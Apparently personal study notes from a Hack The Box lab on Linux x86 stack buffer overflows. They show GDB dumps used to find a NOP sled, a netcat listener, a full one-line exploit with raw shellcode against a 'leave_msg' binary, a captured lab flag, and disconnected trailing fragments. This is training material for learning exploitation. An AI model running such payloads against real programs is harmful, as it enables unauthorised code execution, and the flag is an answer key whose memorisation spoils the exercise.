[[Stack-Based Buffer Overflows on Linux x86]]
After checking that we still control the EIP with our shellcode, we now **need a `memory address` where our NOPs are located to tell the EIP to jump to it.** This memory address must not contain any of the bad characters we found previously.

#### GDB NOPS
```shell-session
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90
								# End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |---> Shellcode
<SNIP>
```

Here, we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address. In this example, we take the address `0xffffd64c`. Illustrated, it then looks like this:

After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the `0xffffd64c` address. Note that the input of the address is entered backward.

```shell-session
 Buffer = "\x55" * (1040 - 124 - 95 - 4) = 841
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

```shell-session
nc -nlvp 31337
```

```shell-session
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

0xffffd716

"\x16\xd7\xff\xff"
AND EXPLOIT 

0x7ffff7e9d260 

```

./leave_msg $(python -c 'print "\x55" * (2064 - 124 - 95 - 4) + "\x90" * 124 + "\xba\xfc\x14\xba\x01\xda\xc9\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x12\x83\xee\xfc\x31\x56\x0e\x03\xaa\x1a\x58\xf4\x63\xf8\x6b\x14\xd0\xbd\xc0\xb1\xd4\xc8\x06\xf5\xbe\x07\x48\x65\x67\x28\x76\x47\x17\x01\xf0\xae\x7f\x98\x08\x5f\xc7\xf4\x0e\x5f\x4d\x6c\x86\xbe\x01\x08\xc8\x11\x32\x66\xeb\x18\x55\x45\x6c\x48\xfd\x38\x42\x1e\x95\xac\xb3\xcf\x07\x44\x45\xec\x95\xc5\xdc\x12\xa9\xe1\x13\x54" + "\x2e\xd7\xff\xff"')

```

HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}

0x22000

2060

ELF 32-bit